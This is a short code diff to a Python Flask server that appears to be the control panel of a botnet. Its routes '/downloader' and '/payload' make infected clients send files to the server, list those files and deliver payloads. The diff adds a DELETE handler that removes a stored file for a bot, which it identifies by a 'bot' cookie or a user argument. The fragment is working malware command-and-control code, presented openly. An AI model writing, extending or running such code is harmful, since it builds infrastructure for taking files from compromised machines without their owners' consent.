@@ -59,7 +59,7 @@ def upload_file():
         return json.dumps({"success": True})
 
 
-@app.route('/downloader', methods=['GET','POST'])
+@app.route('/downloader', methods=['GET','POST','DELETE'])
 def download_file():
     '''
     POST: make the client start sending file to server
@@ -90,8 +90,19 @@ def download_file():
         else:
             filestr = json.dumps(botnet.getDownloadFiles())
             return Response(filestr, status=200, mimetype='application/json')
-    else:
-        return "No file selected", 404
+    elif request.method == 'DELETE':
+        if 'file' in request.args:
+            if 'user' in request.args:
+                user = request.args.get('user')
+            else:
+                user = request.cookies.get('bot')
+            filename = request.args.get('file')
+            if botnet.deleteFile(user,filename):
+                return "done"
+            else:
+                return "File not found", 404
+        else:
+            return "No file selected", 404
 
 
 @app.route('/payload', methods=['GET', 'POST'])
